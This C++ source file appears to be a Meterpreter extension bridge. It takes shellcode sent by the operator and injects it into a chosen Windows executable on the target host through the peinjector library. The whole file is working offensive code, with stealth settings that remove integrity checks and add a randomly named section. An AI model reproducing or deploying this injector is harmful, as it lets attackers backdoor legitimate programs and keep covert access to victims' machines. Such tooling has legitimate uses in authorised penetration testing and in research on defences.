/*!
* @file peinjector_bridge.cpp
* @brief Wrapper functions for bridging native meterp calls to peinjector
*/

#include "common.h"
#include "common_metapi.h"
#include "peinjector.h"
#include "peinjector_bridge.h"
#include "libpeinfect.h"

void __load_config(PEINFECT *infect, BYTE* shellcode, UINT shellcode_size, bool is_x64) {
	size_t test_codesize_x86 = 0;
	size_t test_codesize_x64 = 0;
	PEINFECT_METHOD methods;
	bool random_section_name = true;
	size_t section_namesize = 0;
	char section_name[NT_SHORT_NAME_LEN] = { 0 };

	/* Load integrity options */
	peinfect_set_removeintegrity(true, infect);
	peinfect_set_trystaystealth(true, infect);

	methods = METHOD_ALL;

	peinfect_set_methods(methods, infect);

	/* Cross section jump iterations */
	peinfect_set_jumpiterations(1, infect);

	/* Encryption */
	peinfect_set_encrypt(false, infect);
	peinfect_set_encryptiterations(1, infect);

	/* New Section Name */
	peinfect_set_sectionname(NULL, 0, random_section_name, infect);

	if (!random_section_name) {
		section_namesize = NT_SHORT_NAME_LEN;
		peinfect_set_sectionname(section_name, section_namesize, false, infect);
	}

	/* Set shellcode */
	peinfect_set_shellcode(shellcode, shellcode_size, is_x64, infect);
}

DWORD request_peinjector_inject_shellcode(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = met_api->packet.create_response(packet);

	if (response)
	{
		DWORD size = 0;
		BYTE* shellcode = met_api->packet.get_tlv_value_raw(packet, TLV_TYPE_PEINJECTOR_SHELLCODE, &size);
		BOOL is_x64 = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_PEINJECTOR_SHELLCODE_ISX64);

		char* target_executable_path = met_api->packet.get_tlv_value_string(packet, TLV_TYPE_PEINJECTOR_TARGET_EXECUTABLE);
		if (shellcode != NULL)
		{
			dprintf("[PEINJECTOR] recived path: %s", target_executable_path);
			dprintf("[PEINJECTOR] recived shellcode: %s", shellcode);
			dprintf("[PEINJECTOR] recived size: %d", size);
			dprintf("[PEINJECTOR] is x64: %d", is_x64);

			PEINFECT infect;
			peinfect_init(&infect);

			__load_config(&infect, shellcode, size, is_x64);

			uint16_t arch = get_file_architecture(target_executable_path);
			dprintf("[PEINJECTOR] arch: %d", arch);

			if (!(arch == 0x014c && is_x64 == true || arch == 0x8664 && is_x64 == false)) {

				if (peinfect_infect_full_file(target_executable_path, &infect, target_executable_path)) {
					dprintf("Shellcode injected successfully\n");
				}
				else {
					dprintf("There was an error, shellcode not injected\n");
					met_api->packet.add_tlv_string(response, TLV_TYPE_PEINJECTOR_RESULT, "There was an error, shellcode not injected");
				}
			}
			else {
				dprintf("The architecture of the file is incompatible with the selected payload\n");
				met_api->packet.add_tlv_string(response, TLV_TYPE_PEINJECTOR_RESULT, "The architecture of the file is incompatible with the selected payload");
			}

			met_api->packet.transmit_response(dwResult, remote, response);
		}
		else
		{
			dprintf("[PEINJECTOR] Shellcode parameter missing from call");
			dwResult = ERROR_INVALID_PARAMETER;
		}
	}
	return dwResult;
}
